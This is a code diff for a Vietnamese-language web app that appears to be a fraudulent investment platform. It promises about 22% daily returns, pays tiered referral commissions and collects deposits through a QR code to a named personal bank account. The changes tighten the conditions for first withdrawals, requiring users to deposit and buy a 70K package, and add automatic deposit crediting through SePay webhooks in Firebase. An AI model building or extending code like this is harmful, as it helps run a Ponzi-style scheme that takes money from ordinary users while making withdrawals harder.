@@ -120,8 +120,11 @@
             </span>
             <div class="text-xs text-slate-400 font-medium">Số Dư Khả Dụng (Đầu Tư / Rút)</div>
             <div id="uiBannerBalance" class="text-2xl font-black text-white mono mt-0.5">0 ₫</div>
-            <div class="text-[10px] text-emerald-400 mono mt-1">
-              ⏰ Giờ hỗ trợ rút tiền: 09:00 - 22:00 hàng ngày (Yêu cầu đã nạp đầu)
+            <div class="text-[10px] text-amber-400 font-bold mono mt-1">
+              📌 Điều kiện mở rút tiền lần đầu: Nạp tối thiểu 70K &amp; Mua gói 70K
+            </div>
+            <div class="text-[10px] text-emerald-400 mono mt-0.5">
+              ⏰ Giờ hỗ trợ rút tiền: 09:00 - 22:00 hàng ngày
             </div>
           </div>
           <div class="flex gap-2">
@@ -134,22 +137,22 @@
       <div>
         <div class="flex justify-between items-center mb-2.5">
           <div class="text-xs font-bold uppercase tracking-wider text-slate-400">Danh Mục Quỹ Sinh Lời (Mua Dồn Thoải Mái)</div>
-          <span class="text-[10px] text-emerald-400 mono font-bold">Chu Kỳ Đúng 24H/Lần</span>
+          <span class="text-[10px] text-emerald-400 mono font-bold">Mở Khóa Lãi Sau Đúng 24H</span>
         </div>
         <div id="uiNodesGrid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3"></div>
       </div>
     </section>
 
-    <!-- 2. TAB: GÓI ĐANG CHẠY (KHÓA CỨNG 24H MỚI ĐƯỢC NHẬN 1 LẦN) -->
+    <!-- 2. TAB: GÓI ĐANG CHẠY -->
     <section id="view-active" class="space-y-3 hidden">
       <div class="vault-card rounded-3xl p-5 border border-white/5 space-y-3">
         <div class="flex items-center justify-between pb-3 border-b border-white/5">
           <div>
             <h3 class="text-sm font-bold text-white">Gói Đang Sinh Lãi Độc Lập</h3>
-            <p class="text-[11px] text-slate-400">Đúng 24 giờ sau khi mua (hoặc sau lần nhận trước) mới mở khóa nhận lãi 1 lần.</p>
+            <p class="text-[11px] text-slate-400">Ngày đầu tiên mua gói chưa nhận lãi. Phải sau đúng 24 giờ đếm ngược mới nhận được lãi ngày 1.</p>
           </div>
           <div>
-            <button onclick="App.harvestAll()" class="px-4 py-2 bg-amber-400 text-black font-black text-xs rounded-xl shadow-md transition active:scale-95">Thu Hoạch Hết</button>
+            <button onclick="App.harvestAll()" class="px-4 py-2 bg-amber-400 text-black font-black text-xs rounded-xl shadow-md transition active:scale-95 shrink-0">Thu Hoạch Hết</button>
           </div>
         </div>
         <div id="uiActiveList" class="space-y-2"></div>
@@ -164,7 +167,7 @@
         </div>
         <h3 class="text-sm font-bold text-white">Quay Thưởng Tiền Mặt 1 Lần</h3>
         <p class="text-[11px] text-slate-400 leading-relaxed">
-          Quay thưởng nhận tiền cộng trực tiếp vào số dư. Mở khóa rút về ngân hàng khi hoàn tất nạp đầu tối thiểu 70k.
+          Quay thưởng nhận tiền cộng trực tiếp vào số dư. Mở khóa rút về ngân hàng khi nạp ít nhất 70k và mua gói 70k.
         </p>
 
         <div class="relative w-64 h-64 mx-auto my-2">
@@ -400,7 +403,7 @@
         </div>
 
         <div class="flex flex-col items-center justify-center p-3 bg-slate-950/90 rounded-2xl border border-emerald-500/30">
-          <span class="text-[10px] font-bold text-slate-400 mb-1.5">Quét mã QR VietinBank thanh toán nhanh</span>
+          <span class="text-[10px] font-bold text-emerald-400 mb-1.5">⚡ Quét QR chuyển khoản tự động cộng tiền sau 3 giây</span>
           <img id="uiSepayQR" src="https://img.vietqr.io/image/ICB-11557000-compact2.jpg?amount=70000&addInfo=NAPTIEN&accountName=HA%20TRUNG%20DUC" alt="QR VietinBank SePay" class="w-44 h-44 object-contain rounded-xl bg-white p-1 shadow-lg">
         </div>
 
@@ -421,10 +424,10 @@
             <span class="font-bold text-white uppercase tracking-wider">HA TRUNG DUC</span>
           </div>
           <div class="flex justify-between items-center pt-1.5 border-t border-white/5">
-            <span class="text-slate-400">Nội dung CK:</span>
+            <span class="text-slate-400">Nội dung CK bắt buộc:</span>
             <span id="uiDepMemo" class="mono font-bold text-amber-400 bg-amber-400/10 px-2 py-0.5 rounded">---</span>
           </div>
-          <p class="text-[9px] text-slate-500 italic text-center">* Quét QR hoặc chuyển tiền trước tới STK trên rồi bấm xác nhận.</p>
+          <p class="text-[9px] text-slate-400 italic text-center">* Giữ nguyên nội dung chuyển khoản là SĐT của bạn để hệ thống SePay tự động duyệt ngay lập tức.</p>
         </div>
 
         <button onclick="App.handleDeposit()" class="w-full py-2.5 bg-emerald-400 text-black font-black text-xs rounded-xl shadow-lg transition active:scale-95">
@@ -434,7 +437,7 @@
 
       <!-- VÙNG RÚT TIỀN -->
       <div id="walletView-wit" class="space-y-2.5 text-xs hidden">
-        <div id="uiWithdrawTimeNotice" class="p-2.5 rounded-xl border flex items-center gap-2 text-[11px] font-bold"></div>
+        <div id="uiWithdrawTimeNotice" class="p-3 rounded-xl border text-[11px] font-bold space-y-1"></div>
 
         <div>
           <label class="block text-slate-400 mb-1 font-semibold">Ngân hàng thụ hưởng</label>
@@ -469,7 +472,7 @@
     if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    const ONE_DAY_MS = 24 * 60 * 60 * 1000; // Chuẩn 24 tiếng đồng hồ (86,400,000 ms)
+    const ONE_DAY_MS = 24 * 60 * 60 * 1000;
 
     const PROTOCOL_NODES = [
       { id: 'node_70k', name: 'Quỹ 70K Tân Thủ', amount: 70000, income: 15714, days: 7, total: 110000, badge: 'Lãi ~22%/Ngày' },
@@ -505,6 +508,7 @@
 
     const App = {
       userPhone: localStorage.getItem('auravault_user') || null,
+      serverTimeOffset: 0,
       state: {
         balance: 0,
         totalDeposited: 0,
@@ -518,27 +522,194 @@
       currentActionPending: null,
       wheelAngle: 0,
       isSpinning: false,
-      isHarvesting: false, // Khóa chống bấm đúp nhận lãi
+      isHarvesting: false,
       f1DepositsHistory: [],
       txStatusTab: 'dep',
       depositRequests: [],
       withdrawRequests: [],
 
       init() {
+        db.ref('.info/serverTimeOffset').on('value', snap => {
+          this.serverTimeOffset = snap.val() || 0;
+        });
+
         this.renderNodes();
         this.detectReferralCodeFromURL();
         this.drawWheelCanvas();
         this.initFirebaseListeners();
-        // Tự động cập nhật đồng hồ đếm ngược 24h mỗi 30 giây
+        this.listenSepayAutoWebhooks(); // Tự động lắng nghe biến động SePay và cộng tiền
+
         setInterval(() => {
-          if (this.userPhone) this.renderActiveList();
-        }, 30000);
+          this.tickCountdownTimers();
+        }, 1000);
+      },
+
+      getNow() {
+        return Date.now() + (this.serverTimeOffset || 0);
+      },
+
+      // =========================================================================
+      // HỆ THỐNG TỰ ĐỘNG DUYỆT NẠP TIỀN SEPAY QUA FIREBASE WEBHOOK
+      // =========================================================================
+      listenSepayAutoWebhooks() {
+        db.ref('sepay_webhooks').on('child_added', snap => {
+          const wh = snap.val();
+          const whKey = snap.key;
+          if (!wh) return;
+
+          // Chỉ nhận giao dịch tiền vào
+          if (wh.transferType && wh.transferType !== 'in') {
+            db.ref('sepay_webhooks/' + whKey).remove();
+            return;
+          }
+
+          const amount = Number(wh.transferAmount || wh.amount || 0);
+          const content = String(wh.content || wh.description || '');
+          const phoneMatches = content.match(/0\d{9}/g) || [];
+
+          if (amount < 70000 || phoneMatches.length === 0) {
+            db.ref('sepay_webhooks/' + whKey).remove();
+            return;
+          }
+
+          const targetPhone = phoneMatches[0];
+          const uniqueTxId = String(wh.id || wh.referenceCode || whKey).replace(/[.#$[\]/]/g, '_');
+
+          // Khóa chống cộng trùng 2 lần bằng Transaction
+          db.ref('sepay_processed/' + uniqueTxId).transaction(curr => {
+            if (curr !== null) return; // Đã cộng rồi thì hủy
+            return { phone: targetPhone, amount: amount, time: Date.now() };
+          }, (err, committed) => {
+            db.ref('sepay_webhooks/' + whKey).remove();
+            if (err || !committed) return;
+            this.executeAutoDepositCredit(targetPhone, amount, uniqueTxId, content);
+          });
+        });
+      },
+
+      executeAutoDepositCredit(targetPhone, amount, uniqueTxId, rawContent) {
+        db.ref('users/' + targetPhone).once('value', snap => {
+          if (!snap.exists()) return;
+          const user = snap.val();
+
+          const newBalance = (Number(user.balance) || 0) + amount;
+          const newTotalDep = (Number(user.totalDeposited) || 0) + amount;
+          const txs = Array.isArray(user.transactions) ? user.transactions : [];
+
+          txs.unshift({
+            id: 'AUTO-' + String(uniqueTxId).slice(-4),
+            type: 'deposit',
+            amount: amount,
+            desc: 'Nạp tự động SePay VietinBank thành công'
+          });
+
+          db.ref('users/' + targetPhone).update({
+            balance: newBalance,
+            totalDeposited: newTotalDep,
+            hasDeposited: true,
+            wheelRewardPending: 0,
+            transactions: txs
+          }).then(() => {
+            // Trả hoa hồng tự động F1 (10%), F2 (3%), F3 (1%)
+            if (user.invite) {
+              const f1Phone = user.invite;
+              db.ref('users/' + f1Phone).once('value', f1Snap => {
+                if (f1Snap.exists()) {
+                  const f1 = f1Snap.val();
+                  const comF1 = amount * 0.10;
+                  const f1Tx = Array.isArray(f1.transactions) ? f1.transactions : [];
+                  const f1Hist = Array.isArray(f1.f1DepositsHistory) ? f1.f1DepositsHistory : [];
+
+                  f1Tx.unshift({ id: 'COM-F1', type: 'profit', amount: comF1, desc: `Hoa hồng 10% từ F1 (${targetPhone}) nạp` });
+                  f1Hist.unshift({ f1Phone: targetPhone, depositAmount: amount, commission: comF1, time: new Date().toLocaleString('vi-VN') });
+
+                  db.ref('users/' + f1Phone).update({
+                    balance: (Number(f1.balance) || 0) + comF1,
+                    transactions: f1Tx,
+                    f1DepositsHistory: f1Hist,
+                    unreadCommission: { fromPhone: targetPhone, depAmount: amount, amount: comF1, time: new Date().toLocaleTimeString('vi-VN') }
+                  });
+                }
+              });
+            }
+
+            // Đổi trạng thái các lệnh chờ duyệt của SĐT này sang Đã Duyệt
+            db.ref('pending_deposits').once('value', pSnap => {
+              const list = pSnap.val() || {};
+              Object.keys(list).forEach(depId => {
+                if (list[depId].phone === targetPhone) {
+                  db.ref('pending_deposits/' + depId).remove();
+                  db.ref(`user_tx_status/${targetPhone}/deposits/${depId}`).update({
+                    status: 'APPROVED',
+                    reason: 'Hệ thống SePay đã tự động cộng tiền vào ví!'
+                  });
+                }
+              });
+            });
+
+            sendTelegramAlertDirect(`
+🤖 <b>SEPAY ĐÃ TỰ ĐỘNG DUYỆT NẠP</b>
+━━━━━━━━━━━━━━━━━━
+👤 <b>SĐT Khách:</b> ${targetPhone}
+💰 <b>Số Tiền Nhận:</b> +${this.formatCurrency(amount)}
+📝 <b>Nội Dung CK:</b> ${rawContent}
+✅ <i>Tiền đã tự động cộng vào số dư người chơi!</i>
+            `);
+
+            if (this.userPhone === targetPhone) {
+              this.closeWallet();
+              this.notify(`🎉 Hệ thống đã nhận +${this.formatCurrency(amount)} và tự động cộng vào ví!`);
+            }
+          });
+        });
+      },
+
+      formatCountdown(ms) {
+        if (ms <= 0) return "00:00:00";
+        const totalSeconds = Math.floor(ms / 1000);
+        const h = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
+        const m = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
+        const s = String(totalSeconds % 60).padStart(2, '0');
+        return `${h}:${m}:${s}`;
+      },
+
+      tickCountdownTimers() {
+        if (!this.userPhone || !this.state.activeInvestments.length) return;
+        const now = this.getNow();
+        let shouldReRender = false;
+
+        this.state.activeInvestments.forEach(item => {
+          const elTimer = document.getElementById(`timer-${item.instanceId}`);
+          if (elTimer && item.nextClaimTime) {
+            const remain = item.nextClaimTime - now;
+            if (remain <= 0) {
+              shouldReRender = true;
+            } else {
+              elTimer.innerText = `⏳ Nhận sau ${this.formatCountdown(remain)}`;
+            }
+          }
+        });
+
+        if (shouldReRender) {
+          this.renderActiveList();
+        }
       },
 
       isWithdrawalTimeValid() {
-        const now = new Date();
+        const now = new Date(this.getNow());
         const hour = now.getHours();
         return hour >= 9 && hour < 22;
+      },
+
+      getWithdrawalConditions() {
+        const hasDeposited70k = Boolean(this.state.hasDeposited || Number(this.state.totalDeposited) >= 70000);
+        const hasBoughtPkg70k = Array.isArray(this.state.activeInvestments) &&
+          this.state.activeInvestments.some(pkg => Number(pkg.amount) >= 70000);
+        return {
+          hasDeposited70k,
+          hasBoughtPkg70k,
+          isEligible: hasDeposited70k && hasBoughtPkg70k
+        };
       },
 
       updateWithdrawalTimeUI() {
@@ -547,25 +718,36 @@
         if (!noticeEl || !submitBtn) return;
 
         const isTimeValid = this.isWithdrawalTimeValid();
-        const hasDepositedOnce = Boolean(this.state.hasDeposited || this.state.totalDeposited >= 70000);
+        const cond = this.getWithdrawalConditions();
 
-        if (!hasDepositedOnce) {
-          noticeEl.className = 'p-2.5 rounded-xl border border-rose-500/40 bg-rose-500/15 text-rose-300 flex items-center gap-2 text-[11px] font-bold';
-          noticeEl.innerHTML = '🔒 <span>Tài khoản chưa nạp đầu! Vui lòng nạp tối thiểu 70.000đ để kích hoạt cổng rút tiền.</span>';
+        if (!cond.isEligible) {
+          noticeEl.className = 'p-3 rounded-xl border border-rose-500/40 bg-rose-500/15 text-rose-200 text-[11px] space-y-1.5';
+          noticeEl.innerHTML = `
+            <div class="font-black text-rose-400 uppercase">🔒 Yêu cầu mở khóa rút tiền lần đầu:</div>
+            <div class="text-slate-300">Muốn rút tiền lần đầu phải <strong>nạp ít nhất 70.000đ</strong> và <strong>mua gói 70K</strong>:</div>
+            <div class="flex items-center justify-between pt-1 border-t border-white/10 mono text-[10px]">
+              <span>1. Nạp tối thiểu 70.000đ:</span>
+              <span class="${cond.hasDeposited70k ? 'text-emerald-400 font-bold' : 'text-rose-400 font-bold'}">${cond.hasDeposited70k ? '✅ Đã hoàn thành' : '❌ Chưa nạp'}</span>
+            </div>
+            <div class="flex items-center justify-between mono text-[10px]">
+              <span>2. Mua gói đầu tư 70K:</span>
+              <span class="${cond.hasBoughtPkg70k ? 'text-emerald-400 font-bold' : 'text-rose-400 font-bold'}">${cond.hasBoughtPkg70k ? '✅ Đã mua gói' : '❌ Chưa mua gói'}</span>
+            </div>
+          `;
           submitBtn.disabled = true;
           submitBtn.className = 'w-full py-2.5 bg-slate-800 text-slate-500 font-bold text-xs rounded-xl cursor-not-allowed border border-white/5';
-          submitBtn.innerText = 'Chưa Đạt Điều Kiện Rút (Cần Nạp Đầu)';
+          submitBtn.innerText = 'Cần Nạp Ít Nhất 70K & Mua Gói 70K Để Rút';
           return;
         }
 
         if (isTimeValid) {
-          noticeEl.className = 'p-2.5 rounded-xl border border-emerald-500/30 bg-emerald-500/10 text-emerald-400 flex items-center gap-2 text-[11px] font-bold';
-          noticeEl.innerHTML = '🟢 <span>Cổng rút tiền đang mở (Hỗ trợ từ 09:00 đến 22:00 hàng ngày)</span>';
+          noticeEl.className = 'p-3 rounded-xl border border-emerald-500/30 bg-emerald-500/10 text-emerald-400 flex items-center gap-2 text-[11px] font-bold';
+          noticeEl.innerHTML = '🟢 <span>Đã đủ điều kiện (Nạp 70K & Mua gói 70K). Cổng rút đang mở (09:00 - 22:00).</span>';
           submitBtn.disabled = false;
           submitBtn.className = 'w-full py-2.5 bg-rose-500 text-white font-black text-xs rounded-xl shadow-lg transition active:scale-95';
           submitBtn.innerText = 'Tạo Lệnh Rút Tiền';
         } else {
-          noticeEl.className = 'p-2.5 rounded-xl border border-rose-500/40 bg-rose-500/15 text-rose-300 flex items-center gap-2 text-[11px] font-bold';
+          noticeEl.className = 'p-3 rounded-xl border border-rose-500/40 bg-rose-500/15 text-rose-300 flex items-center gap-2 text-[11px] font-bold';
           noticeEl.innerHTML = '🔒 <span>Cổng rút tiền hiện đang khóa! Chỉ mở từ 09:00 sáng đến 22:00 đêm.</span>';
           submitBtn.disabled = true;
           submitBtn.className = 'w-full py-2.5 bg-slate-800 text-slate-500 font-bold text-xs rounded-xl cursor-not-allowed border border-white/5';
@@ -597,23 +779,20 @@
         setTimeout(() => box.classList.add('-translate-y-28', 'opacity-0', 'pointer-events-none'), 3200);
       },
 
-      // =========================================================================
-      // TỰ ĐỘNG RESET TOÀN BỘ GÓI CŨ BỊ LỖI VỀ 0 NGÀY & KIỂM TRA ĐÚNG 24H THỰC TẾ
-      // =========================================================================
       sanitizeAndSyncPackages(investments) {
         if (!Array.isArray(investments) || investments.length === 0) {
           return { needSave: false, list: [] };
         }
         let needSave = false;
-        const now = Date.now();
+        const now = this.getNow();
 
         investments.forEach(item => {
-          // Nếu gói thuộc phiên bản cũ (chưa có cờ versionFixed === 2) hoặc bị vượt ngày -> Reset sạch về 0
-          if (item.versionFixed !== 2 || !item.lastClaimTime || item.daysPassed > item.days) {
+          if (item.schemaVersion !== 3 || !item.nextClaimTime || item.daysPassed > item.days) {
             item.daysPassed = 0;
             item.pending = 0;
-            item.lastClaimTime = now;
-            item.versionFixed = 2;
+            item.purchasedAt = now;
+            item.nextClaimTime = now + ONE_DAY_MS;
+            item.schemaVersion = 3;
             needSave = true;
           }
         });
@@ -621,41 +800,22 @@
         return { needSave, list: investments };
       },
 
-      // Tính toán xem gói đã đủ 24 giờ kể từ lần nhận trước chưa
       getPackageClaimState(item) {
-        const now = Date.now();
-        const lastTime = Number(item.lastClaimTime) || now;
+        const now = this.getNow();
         const daysPassed = Number(item.daysPassed) || 0;
         const maxDays = Number(item.days) || 18;
+        const nextClaimTime = Number(item.nextClaimTime) || (now + ONE_DAY_MS);
 
         if (daysPassed >= maxDays) {
-          return { canClaim: false, claimableDays: 0, claimableAmount: 0, statusText: 'Đã Hoàn Tất Chu Kỳ' };
+          return { canClaim: false, claimableAmount: 0, remainMs: 0, isCompleted: true };
         }
 
-        const elapsedMs = now - lastTime;
-        if (elapsedMs < ONE_DAY_MS) {
-          const remainMs = ONE_DAY_MS - elapsedMs;
-          const remainHours = Math.floor(remainMs / (1000 * 60 * 60));
-          const remainMins = Math.ceil((remainMs % (1000 * 60 * 60)) / (1000 * 60));
-          return {
-            canClaim: false,
-            claimableDays: 0,
-            claimableAmount: 0,
-            statusText: `⏳ Chờ ${remainHours}h ${remainMins}p`
-          };
+        const remainMs = nextClaimTime - now;
+        if (remainMs > 0) {
+          return { canClaim: false, claimableAmount: 0, remainMs: remainMs, isCompleted: false };
         }
 
-        // Đã qua ít nhất 24h -> Tính số ngày thực tế được nhận (tối đa không vượt quá số ngày còn lại)
-        const fullDaysElapsed = Math.floor(elapsedMs / ONE_DAY_MS);
-        const claimableDays = Math.min(fullDaysElapsed, maxDays - daysPassed);
-        const claimableAmount = claimableDays * (Number(item.income) || 0);
-
-        return {
-          canClaim: claimableDays > 0 && claimableAmount > 0,
-          claimableDays,
-          claimableAmount,
-          statusText: 'Nhận Lãi Ngay'
-        };
+        return { canClaim: true, claimableAmount: Number(item.income) || 0, remainMs: 0, isCompleted: false };
       },
 
       initFirebaseListeners() {
@@ -666,7 +826,6 @@
 
         if (!this.userPhone) return;
 
-        // Ngắt listener cũ trước khi gắn mới để không bị nhân đôi sự kiện
         db.ref('users/' + this.userPhone).off();
         db.ref('users/' + this.userPhone).on('value', snap => {
           if (snap.exists()) {
@@ -781,7 +940,7 @@
               <h4 class="text-sm font-bold text-white mt-1">${node.name}</h4>
               <div class="text-lg font-black text-white mono my-2">${this.formatCurrency(node.amount)}</div>
               <div class="p-2.5 rounded-xl bg-slate-950/80 text-[11px] space-y-1 border border-white/5 mono">
-                <div class="flex justify-between text-slate-400"><span>Lãi 24h:</span><span class="text-emerald-400 font-bold">+${this.formatCurrency(node.income)}</span></div>
+                <div class="flex justify-between text-slate-400"><span>Lãi sau mỗi 24h:</span><span class="text-emerald-400 font-bold">+${this.formatCurrency(node.income)}</span></div>
                 <div class="flex justify-between text-slate-400"><span>Tổng nhận:</span><span class="text-cyan-400 font-bold">${this.formatCurrency(node.total)}</span></div>
               </div>
             </div>
@@ -975,7 +1134,7 @@
 
         this.currentActionPending = { type: 'STAKE', data: node };
         document.getElementById('confirmActionTitle').innerText = 'Xác Nhận Mua Gói Đầu Tư';
-        document.getElementById('confirmActionDesc').innerText = `Kích hoạt ${node.name} với số tiền ${this.formatCurrency(node.amount)}?`;
+        document.getElementById('confirmActionDesc').innerText = `Kích hoạt ${node.name} với số tiền ${this.formatCurrency(node.amount)}? (Lãi ngày đầu tiên sẽ mở khóa sau đúng 24 giờ)`;
         
         document.getElementById('btnConfirmActionYes').onclick = () => this.executeAction();
         document.getElementById('btnConfirmActionNo').onclick = () => this.openRejectModal();
@@ -985,9 +1144,12 @@
       promptWithdrawConfirmation() {
         if (!this.userPhone) return this.openAuth();
 
-        const hasDepositedOnce = Boolean(this.state.hasDeposited || this.state.totalDeposited >= 70000);
-        if (!hasDepositedOnce) {
-          return this.notify('Bạn cần nạp tiền lần đầu (tối thiểu 70.000 VNĐ) để kích hoạt tính năng rút!', true);
+        const cond = this.getWithdrawalConditions();
+        if (!cond.hasDeposited70k) {
+          return this.notify('Muốn rút tiền lần đầu phải nạp ít nhất 70.000đ và mua gói 70K! (Bạn chưa nạp đủ 70K)', true);
+        }
+        if (!cond.hasBoughtPkg70k) {
+          return this.notify('Muốn rút tiền lần đầu phải nạp ít nhất 70.000đ và mua gói 70K! (Bạn chưa mua gói 70K)', true);
         }
 
         if (!this.isWithdrawalTimeValid()) {
@@ -1020,9 +1182,10 @@
           const node = this.currentActionPending.data;
           if (this.state.balance < node.amount) return this.notify('Số dư không đủ!', true);
 
+          const now = this.getNow();
           const newBal = this.state.balance - node.amount;
           const newInvestments = [...this.state.activeInvestments];
-          // Khi kích hoạt gói mới: bắt đầu từ 0 ngày, chờ đủ 24h sau mới được nhận lần 1
+
           newInvestments.unshift({
             instanceId: 'ACT-' + Math.floor(1000 + Math.random() * 9000),
             name: node.name,
@@ -1031,8 +1194,9 @@
             days: node.days,
             daysPassed: 0,
             pending: 0,
-            lastClaimTime: Date.now(),
-            versionFixed: 2
+            purchasedAt: now,
+            nextClaimTime: now + ONE_DAY_MS,
+            schemaVersion: 3
           });
 
           const newTransactions = [...this.state.ledger];
@@ -1040,7 +1204,7 @@
             id: 'TX-' + Math.floor(1000 + Math.random() * 9000),
             type: 'invest',
             amount: node.amount,
-            desc: `Đầu tư ${node.name}`
+            desc: `Đầu tư ${node.name} (Nhận lãi sau 24h)`
           });
 
           db.ref('users/' + this.userPhone).update({
@@ -1048,9 +1212,15 @@
             activeInvestments: newInvestments,
             transactions: newTransactions
           }).then(() => {
-            this.notify(`Đã kích hoạt thành công ${node.name}! Lãi mở khóa sau mỗi 24h.`);
+            this.notify(`Đã mua ${node.name}! Sau đúng 24h sẽ nhận được lãi ngày đầu tiên.`);
           });
         } else if (this.currentActionPending.type === 'WITHDRAW') {
+          const cond = this.getWithdrawalConditions();
+          if (!cond.isEligible) {
+            this.currentActionPending = null;
+            return this.notify('Muốn rút tiền lần đầu phải nạp ít nhất 70.000đ và mua gói 70K!', true);
+          }
+
           if (!this.isWithdrawalTimeValid()) {
             this.currentActionPending = null;
             return this.notify('Ngoài khung giờ hỗ trợ (09:00 - 22:00). Lệnh rút bị hủy!', true);
@@ -1126,7 +1296,6 @@
         this.currentActionPending = null;
       },
 
-      // HIỂN THỊ DANH SÁCH GÓI ĐANG CHẠY KÈM TRẠNG THÁI KHÓA 24H
       renderActiveList() {
         const box = document.getElementById('uiActiveList');
         if (!box) return;
@@ -1137,21 +1306,25 @@
         box.innerHTML = this.state.activeInvestments.map(item => {
           const claimInfo = this.getPackageClaimState(item);
           return `
-            <div class="p-3 bg-slate-950/80 rounded-2xl border border-white/5 flex items-center justify-between text-xs gap-2">
+            <div class="p-3.5 bg-slate-950/80 rounded-2xl border border-white/5 flex items-center justify-between text-xs gap-2">
               <div>
-                <div class="font-bold text-white">${item.name} (${item.daysPassed || 0}/${item.days} ngày)</div>
+                <div class="font-bold text-white">${item.name} <span class="text-emerald-400 mono">(${item.daysPassed || 0}/${item.days} ngày)</span></div>
                 <div class="text-slate-400 text-[11px] mt-0.5">
                   Lãi chờ nhận: <strong class="${claimInfo.canClaim ? 'text-emerald-400' : 'text-slate-500'} mono">+${this.formatCurrency(claimInfo.claimableAmount)}</strong>
                 </div>
-                <div class="text-[10px] text-amber-400/80 mono mt-0.5">Mức lãi: +${this.formatCurrency(item.income)} / 24h</div>
+                <div class="text-[10px] text-amber-400/80 mono mt-0.5">Định mức: +${this.formatCurrency(item.income)} / sau mỗi 24h</div>
               </div>
-              ${claimInfo.canClaim ? `
-                <button onclick="App.harvestSingle('${item.instanceId}')" class="px-3 py-2 bg-amber-400 text-black font-black rounded-xl active:scale-95 transition shrink-0 shadow">
+              ${claimInfo.isCompleted ? `
+                <button disabled class="px-3 py-2 bg-slate-900 text-slate-500 font-bold rounded-xl border border-white/5 cursor-not-allowed shrink-0 text-[11px]">
+                  Đã Hoàn Tất
+                </button>
+              ` : claimInfo.canClaim ? `
+                <button onclick="App.harvestSingle('${item.instanceId}')" class="px-3.5 py-2 bg-amber-400 text-black font-black rounded-xl active:scale-95 transition shrink-0 shadow-lg">
                   Thu Hoạch
                 </button>
               ` : `
-                <button disabled class="px-3 py-2 bg-slate-900 text-slate-500 font-bold rounded-xl border border-white/5 cursor-not-allowed shrink-0 text-[11px]">
-                  ${claimInfo.statusText}
+                <button disabled id="timer-${item.instanceId}" class="px-3 py-2 bg-slate-900 text-amber-400/90 mono font-bold rounded-xl border border-amber-500/20 cursor-not-allowed shrink-0 text-[11px]">
+                  ⏳ Nhận sau ${this.formatCountdown(claimInfo.remainMs)}
                 </button>
               `}
             </div>
@@ -1159,7 +1332,6 @@
         }).join('');
       },
 
-      // THU HOẠCH ĐƠN LẺ (CHỐNG BẤM LẶP + KIỂM TRA ĐỦ 24H)
       harvestSingle(instId) {
         if (this.isHarvesting) return;
         const target = this.state.activeInvestments.find(i => i.instanceId === instId);
@@ -1167,24 +1339,25 @@
 
         const claimInfo = this.getPackageClaimState(target);
         if (!claimInfo.canClaim || claimInfo.claimableAmount <= 0) {
-          return this.notify(`Chưa đủ 24 giờ! (${claimInfo.statusText})`, true);
+          return this.notify(`Chưa đủ 24 giờ! Còn phải chờ ${this.formatCountdown(claimInfo.remainMs)} nữa mới nhận được lãi.`, true);
         }
 
         this.isHarvesting = true;
+        const now = this.getNow();
         const amt = claimInfo.claimableAmount;
         const newBal = this.state.balance + amt;
 
-        target.daysPassed = (Number(target.daysPassed) || 0) + claimInfo.claimableDays;
+        target.daysPassed = (Number(target.daysPassed) || 0) + 1;
         target.pending = 0;
-        target.lastClaimTime = Date.now();
-        target.versionFixed = 2;
+        target.nextClaimTime = now + ONE_DAY_MS;
+        target.schemaVersion = 3;
 
         const newLedger = [...this.state.ledger];
         newLedger.unshift({
           id: 'TX-' + Math.floor(1000 + Math.random() * 9000),
           type: 'profit',
           amount: amt,
-          desc: `Thu hoạch ${target.name} (${target.daysPassed}/${target.days} ngày)`
+          desc: `Nhận lãi ngày ${target.daysPassed}/${target.days} - ${target.name}`
         });
 
         db.ref('users/' + this.userPhone).update({
@@ -1194,31 +1367,30 @@
         }).then(() => {
           this.isHarvesting = false;
           this.renderUI();
-          this.notify(`Đã nhận +${this.formatCurrency(amt)} vào ví! Hẹn gặp lại sau 24h.`);
+          this.notify(`Đã nhận +${this.formatCurrency(amt)} (Ngày ${target.daysPassed}/${target.days})! Đã khóa đếm ngược 24h cho ngày tiếp theo.`);
         }).catch(() => {
           this.isHarvesting = false;
         });
       },
 
-      // THU HOẠCH TẤT CẢ (CHỐNG BẤM LẶP + KIỂM TRA ĐỦ 24H)
       harvestAll() {
         if (this.isHarvesting) return;
         let total = 0;
-        const now = Date.now();
+        const now = this.getNow();
 
         this.state.activeInvestments.forEach(item => {
           const claimInfo = this.getPackageClaimState(item);
           if (claimInfo.canClaim && claimInfo.claimableAmount > 0) {
             total += claimInfo.claimableAmount;
-            item.daysPassed = (Number(item.daysPassed) || 0) + claimInfo.claimableDays;
+            item.daysPassed = (Number(item.daysPassed) || 0) + 1;
             item.pending = 0;
-            item.lastClaimTime = now;
-            item.versionFixed = 2;
+            item.nextClaimTime = now + ONE_DAY_MS;
+            item.schemaVersion = 3;
           }
         });
 
         if (total <= 0) {
-          return this.notify('Chưa có gói nào đủ 24 giờ để thu hoạch! Vui lòng chờ hết thời gian đếm ngược.', true);
+          return this.notify('Không thể nhận! Khi mới mua gói phải chờ đủ 24 giờ đếm ngược mới nhận được lãi.', true);
         }
 
         this.isHarvesting = true;
@@ -1228,7 +1400,7 @@
           id: 'TX-' + Math.floor(1000 + Math.random() * 9000),
           type: 'profit',
           amount: total,
-          desc: 'Thu hoạch tất cả các quỹ đủ 24h'
+          desc: 'Thu hoạch tất cả các quỹ đã đủ 24h'
         });
 
         db.ref('users/' + this.userPhone).update({
@@ -1361,7 +1533,7 @@
           `);
 
           this.closeWallet();
-          this.notify(`Đã gửi lệnh nạp ${this.formatCurrency(amt)}. Chờ Admin duyệt!`);
+          this.notify(`Đã gửi lệnh nạp ${this.formatCurrency(amt)}. Hệ thống sẽ tự động cộng khi nhận được chuyển khoản!`);
         });
       },
 
